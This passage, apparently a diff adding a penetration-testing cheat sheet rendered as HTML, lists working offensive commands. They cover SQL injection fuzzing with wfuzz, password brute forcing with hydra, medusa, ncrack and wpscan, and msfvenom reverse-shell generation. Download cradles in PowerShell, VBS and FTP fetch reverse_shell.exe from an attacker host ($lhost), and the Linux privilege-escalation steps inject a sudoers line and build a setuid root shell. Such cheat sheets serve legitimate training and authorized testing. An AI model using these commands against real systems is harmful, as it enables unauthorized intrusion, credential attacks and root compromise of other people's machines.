+<p>SQLi: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="w">    </span>wfuzz<span class="w"> </span>-v<span class="w"> </span>-c<span class="w">  </span>-w<span class="w"> </span>/usr/share/wordlists/wfuzz/Injections/SQL.txt<span class="w"> </span>-u<span class="w"> </span><span class="nv">$url</span>/index.php?id<span class="o">=</span>FUZZ<span class="w"> </span>-p<span class="w"> </span><span class="nv">$burpIPandPort</span>:HTTP<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$Cookie_Field</span><span class="s2">&quot;</span><span class="w"> </span>-f<span class="w"> </span>wfuzz_results.txt
+</span></code></pre></div></p>
+<ul>
+<li>Wordlists<ul>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi">Seclists</a></li>
+<li><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/detect">FuzzDB</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>BRUTEFORCE:</p>
+<ul>
+<li>MULTIPLE:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="w">    </span>wfuzz<span class="w"> </span>-v<span class="w"> </span>-c<span class="w">  </span>-w<span class="w"> </span><span class="nv">$wordlist_username</span><span class="w"> </span>-w<span class="w"> </span><span class="nv">$wordlist_password</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$url</span>/login.php<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;username=FUZZ=FUZ2Z&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$burpIPandPort</span>:HTTP<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$Cookie</span><span class="s2">-Field&quot;</span><span class="w"> </span>-f<span class="w"> </span>wfuzz_results.txt
+</span></code></pre></div></li>
+<li>SINGLE:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="w">    </span>wfuzz<span class="w"> </span>-v<span class="w"> </span>-c<span class="w">  </span>-w<span class="w"> </span><span class="nv">$wordlist</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$url</span>/login.php<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;username=admin=FUZZ&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$burpIPandPort</span>:HTTP<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$Cookie</span><span class="s2">-Field&quot;</span><span class="w"> </span>-f<span class="w"> </span>wfuzz_results.txt
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>WORDPRESS:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="w">    </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://<span class="nv">$rhost</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">    </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://<span class="nv">$rhost</span><span class="w"> </span>--enumerate<span class="w"> </span>u
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">    </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://<span class="nv">$rhost</span><span class="w"> </span>--wordlist<span class="w"> </span>/usr/share/wordlists/rockyou-10k.txt<span class="w"> </span>--user<span class="w"> </span>admin
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">    </span>nmap<span class="w"> </span>-sV<span class="w"> </span>--script<span class="o">=</span>http-wordpress-brute<span class="w"> </span>--script-args<span class="w"> </span><span class="s1">&#39;userdb=/root/Downloads/user.txt,passdb=/usr/share/wordlists/rockyou-10k.txt,http-wordpress-brute.threads=3,brute.firstonly=true&#39;</span><span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></li>
+<li>Dashboard to RCE Shell: <a href="https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/">Pentaroot</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="brute-forcing-online">Brute Forcing Online</h2>
+<ol>
+<li><code class="language-bash highlight">cewl<span class="w"> </span><span class="nv">$url</span><span class="w"> </span>-m<span class="w"> </span><span class="m">6</span><span class="w"> </span>-w<span class="w"> </span><span class="nv">$url</span>.txt</code></li>
+<li>Edit /etc/john/john.conf and add the lines below to the end
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>    20$[0-2]$[0-9]
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>    19$[5-9]$[0-9]
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>    $[0-9]$[0-9]
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>    $[0-9]$[0-9]$[0-9]
+</span></code></pre></div></li>
+<li>
+<p><code class="language-bash highlight">john<span class="w"> </span>--wordlist<span class="o">=</span>cewl-<span class="nv">$url</span>.txt<span class="w"> </span>--rules<span class="w"> </span>--stdout<span class="w">  </span>cewl-johnMutated-wordlist-<span class="nv">$url</span>.txt</code></p>
+</li>
+<li>
+<p>SSH/FTP/MSSQL:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="w">    </span>hydra<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-l<span class="w"> </span><span class="nv">$username</span><span class="w"> </span>-P<span class="w"> </span><span class="nv">$wordlist</span><span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span><span class="nv">$protocol</span><span class="o">(</span>ssh/ftp/mssql<span class="o">)[</span>common<span class="w"> </span>usernames:<span class="w"> </span><span class="nv">mssql</span><span class="o">=</span>sa,ssh<span class="o">=</span>root,ftp<span class="o">=</span>anonymous/root,<span class="o">]</span>
+</span></code></pre></div></p>
+</li>
+<li>RDP:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="w">    </span>ncrack<span class="w"> </span>-u<span class="w"> </span><span class="nv">$username</span><span class="w"> </span>-P<span class="w"> </span><span class="nv">$wordlist</span><span class="w"> </span><span class="nv">$rhost</span>:<span class="nv">$rport</span>
+</span></code></pre></div></li>
+<li>WEB:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="w">    </span>medusa<span class="w"> </span>-h<span class="w"> </span><span class="nv">$url</span><span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>cewl-johnMutated-wordlist-<span class="nv">$url</span>.txt<span class="w"> </span>-M<span class="w"> </span>http<span class="w"> </span>-m<span class="w"> </span>DIR:/<span class="o">(</span>where<span class="w"> </span>the<span class="w"> </span>login<span class="w"> </span>is<span class="o">)</span><span class="w"> </span>-T<span class="w"> </span><span class="m">10</span>
+</span></code></pre></div><ul>
+<li>BurpSuite</li>
+</ul>
+</li>
+<li>HTTP-BasicAuth: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="w">    </span>hydra<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-L<span class="w"> </span><span class="nv">$username</span>-wordlist<span class="w"> </span>-P<span class="w"> </span>cewl-johnMutated-wordlist-<span class="nv">$url</span>.txt<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>-s<span class="w"> </span><span class="nv">$rport</span><span class="w"> </span>http-get<span class="w"> </span>/<span class="nv">$rpath</span>
+</span></code></pre></div></li>
+<li>SMB:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="w">    </span>hydra<span class="w"> </span>-l<span class="w"> </span><span class="nv">$username</span><span class="w"> </span>-P<span class="w"> </span><span class="nv">$wordlist</span>.txt<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>smb<span class="w"> </span>-V
+</span></code></pre></div></li>
+</ol>
+<hr />
+<h2 id="exploitation">Exploitation</h2>
+<ul>
+<li>exploit-db.com</li>
+<li>Security Focus</li>
+<li>CVE details</li>
+<li>Github</li>
+<li>Google</li>
+<li>Compilation: i686-w64-mingw32-gcc -lws2_32 $filename.c -o $filename.exe</li>
+</ul>
+<hr />
+<h2 id="initial-shell-checks">Initial Shell Checks</h2>
+<ul>
+<li>Windows: 
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>    hostname <span class="p">&amp;</span> whoami /all <span class="p">&amp;</span> ipconfig <span class="p">&amp;</span> systeminfo <span class="p">&amp;</span> net user <span class="p">&amp;</span> net localgroup <span class="p">&amp;</span> net user /domain <span class="p">&amp;</span> tasklist /V
+</span></code></pre></div></li>
+<li>Linux:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="w">    </span>hostname<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>whoami<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>id<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>w<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ifconfig<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/etc/*release*<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>uname<span class="w"> </span>-a<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>env<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span>-p<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>-l
+</span></code></pre></div></li>
+<li><strong>Find</strong> in Windows:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>    <span class="k">dir</span> /s $driverletter:\$filenameorpattern - i.e.(dir /s c:\proof.txt)
+</span></code></pre></div></li>
+<li><strong>Find</strong> in Unix:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="w">    </span>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="nv">$filenametofind</span>
+</span></code></pre></div></li>
+</ul>
+<h2 id="shells">Shells</h2>
+<ul>
+<li>Try to use empire instead of metasploit for post exploitation and reverse shell</li>
+<li>
+<p>MSFVENOM:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="w">    </span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$lhost</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">9</span><span class="w"> </span>-o<span class="w"> </span>reverse_shell.exe
+</span></code></pre></div></p>
+</li>
+<li>
+<p>WGET-Win-PS1:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>    <span class="nb">echo </span><span class="nv">$storageDir</span> <span class="p">=</span> <span class="nv">$pwd</span>  <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>    <span class="nb">echo </span><span class="nv">$webclient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span> <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>    <span class="nb">echo </span><span class="nv">$url</span> <span class="p">=</span> <span class="s2">&quot;http://$lhost:8000/reverse_shell.exe&quot;</span> <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>    <span class="nb">echo </span><span class="nv">$file</span> <span class="p">=</span> <span class="s2">&quot;reverse_shell.exe&quot;</span> <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>    <span class="nb">echo </span><span class="nv">$webclient</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$file</span><span class="p">)</span> <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>    <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-NoLogo</span> <span class="n">-NonInteractive</span> <span class="n">-NoProfile</span> <span class="o">-File</span> <span class="n">wget</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>WGET-Win-VBS:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>    <span class="k">echo</span> strUrl = WScript.Arguments.Item(0)  wget.vbs
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>    <span class="k">echo</span> StrFile = WScript.Arguments.Item(1)  wget.vbs
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>    <span class="k">echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  wget.vbs
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>    <span class="k">echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  wget.vbs
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>    <span class="k">echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  wget.vbs
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>    <span class="k">echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = 2  wget.vbs
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>    <span class="k">echo</span> Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  wget.vbs
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>    <span class="k">echo</span> Err.Clear  wget.vbs
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>    <span class="k">echo</span> Set http = Nothing  wget.vbs
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>    <span class="k">echo</span> Set http = CreateObject(<span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)  wget.vbs
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>    <span class="k">echo</span> If http Is Nothing Then Set http = CreateObject(<span class="s2">&quot;WinHttp.WinHttpRequest&quot;</span>)  wget.vbs
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>    <span class="k">echo</span> If http Is Nothing Then Set http = CreateObject(<span class="s2">&quot;MSXML2.ServerXMLHTTP&quot;</span>)  wget.vbs
+</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a>    <span class="k">echo</span> If http Is Nothing Then Set http = CreateObject(<span class="s2">&quot;Microsoft.XMLHTTP&quot;</span>)  wget.vbs
+</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a>    <span class="k">echo</span> http.Open <span class="s2">&quot;GET&quot;</span>, strURL, False  wget.vbs
+</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a>    <span class="k">echo</span> http.Send  wget.vbs
+</span><span id="__span-41-16"><a id="__codelineno-41-16" name="__codelineno-41-16" href="#__codelineno-41-16"></a>    <span class="k">echo</span> varByteArray = http.ResponseBody  wget.vbs
+</span><span id="__span-41-17"><a id="__codelineno-41-17" name="__codelineno-41-17" href="#__codelineno-41-17"></a>    <span class="k">echo</span> Set http = Nothing  wget.vbs
+</span><span id="__span-41-18"><a id="__codelineno-41-18" name="__codelineno-41-18" href="#__codelineno-41-18"></a>    <span class="k">echo</span> Set fs = CreateObject(<span class="s2">&quot;Scripting.FileSystemObject&quot;</span>)  wget.vbs
+</span><span id="__span-41-19"><a id="__codelineno-41-19" name="__codelineno-41-19" href="#__codelineno-41-19"></a>    <span class="k">echo</span> Set ts = fs.CreateTextFile(StrFile, True)  wget.vbs
+</span><span id="__span-41-20"><a id="__codelineno-41-20" name="__codelineno-41-20" href="#__codelineno-41-20"></a>    <span class="k">echo</span> strData = <span class="s2">&quot;&quot;</span>  wget.vbs
+</span><span id="__span-41-21"><a id="__codelineno-41-21" name="__codelineno-41-21" href="#__codelineno-41-21"></a>    <span class="k">echo</span> strBuffer = <span class="s2">&quot;&quot;</span>  wget.vbs
+</span><span id="__span-41-22"><a id="__codelineno-41-22" name="__codelineno-41-22" href="#__codelineno-41-22"></a>    <span class="k">echo</span> For lngCounter = 0 to UBound(varByteArray)  wget.vbs
+</span><span id="__span-41-23"><a id="__codelineno-41-23" name="__codelineno-41-23" href="#__codelineno-41-23"></a>    <span class="k">echo</span> ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  wget.vbs
+</span><span id="__span-41-24"><a id="__codelineno-41-24" name="__codelineno-41-24" href="#__codelineno-41-24"></a>    <span class="k">echo</span> Next  wget.vbs
+</span><span id="__span-41-25"><a id="__codelineno-41-25" name="__codelineno-41-25" href="#__codelineno-41-25"></a>    <span class="k">echo</span> ts.Close  wget.vbs
+</span><span id="__span-41-26"><a id="__codelineno-41-26" name="__codelineno-41-26" href="#__codelineno-41-26"></a>    cscript wget.vbs http://$lhost:8000/reverse_shell.exe reverse_shell.exe
+</span></code></pre></div></p>
+</li>
+<li>WGET-Windows-FTP:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>    <span class="k">echo</span> open $lhost 21 ftp.txt
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>    <span class="k">echo</span> USER anonymous ftp.txt
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>    <span class="k">echo</span> anonymous ftp.txt
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>    <span class="k">echo</span> bin  ftp.txt
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>    <span class="k">echo</span> hash  ftp.txt
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>    <span class="k">echo</span> GET reverse_shell.exe  ftp.txt
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>    <span class="k">echo</span> bye  ftp.txt
+</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>    ftp -v -n -s:ftp.txt
+</span></code></pre></div></li>
+<li>
+<p>WGET-Python:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>    python -c <span class="s2">&quot;import urllib; urllib.urlretrieve (&#39;http://$url:8000/$filename&#39;, &#39;C:\$filename&#39;)&quot;</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>Hosting-HTTP:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>    python3 -m http.server
+</span></code></pre></div></p>
+</li>
+<li>Hosting-FTP:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>    python -m pyftpdlib -p 21(pip install pyftpdlib)
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h2 id="privilege-escalation-linux">Privilege Escalation - Linux</h2>
+<ul>
+<li>linuxprivchecker.py <a href="[sleventyeleven](https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py)">^1</a></li>
+<li>linux-local-enum.sh<a href="[highon.coffee](https://highon.coffee/downloads/linux-local-enum.sh)">^2</a></li>
+<li>LinEnum.sh <a href="[rebootuser](https://github.com/rebootuser/LinEnum)">^3</a></li>
+<li>Pspy:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>    ./pspy64 -pf -i 1000 -c  (Run this in another terminal/shell right after enum scripts)
+</span></code></pre></div></li>
+<li>Check for writable folders:</li>
+</ul>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span>directory1<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>-lR<span class="w"> </span><span class="m">21</span><span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;Permission&quot;</span><span class="w"> </span><span class="p">|</span>grep<span class="w"> </span>dr<span class="p">|</span>grep<span class="w"> </span>xrw<span class="p">|</span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;drwxrwxr-x&quot;</span><span class="p">|</span>grep<span class="w"> </span>-v<span class="w"> </span>driver<span class="p">|</span>grep<span class="w"> </span>-v<span class="w"> </span>drv<span class="p">|</span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">|</span>awk<span class="w"> </span><span class="s1">&#39;{print $9}&#39;</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>directory2<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="nv">$directory1</span><span class="w"> </span><span class="m">21</span><span class="p">|</span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;Permission&quot;</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>ls<span class="w"> </span>-ld<span class="w"> </span><span class="nv">$directory2</span><span class="p">|</span>grep<span class="w"> </span>xrw<span class="p">|</span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</span></code></pre></div>
+* ADD to sudoers command:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash&#39;</span><span class="w">  </span>/tmp/addMeToSUDOERS
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;echo &quot;www-data ALL=NOPASSWD: ALL&quot;  /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#39;</span><span class="w">  </span>/tmp/addMeToSUDOERS
+</span></code></pre></div>
+* ADD to sudoers command:
+    * ALTERNATIVE to ABOVE:
+    <div class="language-c highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="w">    </span><span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"> </span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="w">    </span><span class="cp"># Compile with: `gcc test.c -o test`</span>
+</span></code></pre></div>
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="w">    </span><span class="c1">#!/bin/bash</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="w">    </span>chown<span class="w"> </span>root<span class="w"> </span>/tmp/test<span class="w"> </span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="w">    </span>chgrp<span class="w"> </span>root<span class="w"> </span>/tmp/test
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="w">    </span>chmod<span class="w"> </span>u+s<span class="w"> </span>/tmp/test<span class="w"> </span>
+</span></code></pre></div>
+* OUT_OF_IDEAS?:   dpkg -l    and check versions with exploit-db
+* STILL OUT?: Follow g0tm1lk <a href="[g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)">^4</a></p>
+<hr />
+<h2 id="privilege-escalation-windows">Privilege Escalation - Windows</h2>
+<ul>
+<li>WindowsPrivCheck.bat <a href="[Accesschk](https://download.sysinternals.com/files/AccessChk.zip)">^5</a>(requires accesschk.exe)
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>    <span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-command</span> <span class="s2">&quot;IEX (New-Object System.Net.Webclient).DownloadFile(&#39;http://$lhost:$lport/WinPrivCheck.bat&#39;,&#39;WinPrivCheck.bat&#39;);&quot;</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>    <span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-command</span> <span class="s2">&quot;IEX (New-Object System.Net.Webclient).DownloadFile(&#39;http://$lhost:$lport/accesschk.exe&#39;,&#39;accesschk.exe&#39;);&quot;</span> 
+</span></code></pre></div></li>
+<li>windows-privesc-check2.exe<ul>
